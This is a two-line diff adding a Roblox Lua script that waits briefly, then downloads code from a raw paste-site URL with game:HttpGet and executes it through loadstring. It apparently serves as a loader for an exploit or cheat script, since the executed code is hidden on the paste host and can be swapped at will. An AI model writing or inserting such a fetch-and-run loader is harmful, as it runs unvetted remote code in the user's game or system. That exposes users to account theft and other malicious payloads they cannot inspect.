@@ -1,0 +1,2 @@
+wait("0.2")
+loadstring(game:HttpGet("https://pastejustit.com/raw/crqoe8cl2n",true))()
